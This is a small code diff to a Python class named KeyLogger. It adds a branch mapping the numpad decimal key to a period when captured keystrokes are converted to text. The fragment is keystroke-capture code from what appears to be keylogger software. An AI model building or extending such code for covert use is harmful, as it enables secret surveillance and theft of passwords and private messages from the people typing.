@@ -92,6 +92,8 @@ class KeyLogger:
                 content = key.char 
             elif hasattr(key, 'vk') and 96 <= key.vk <= 105:
                 content = str(key.vk - 96)
+            elif hasattr(key, 'vk') and key.vk == 110:
+                content = "."
             else:
                 key_str = str(key).replace('Key.', '')
                 if key == keyboard.KeyCode.from_char('\x16'):
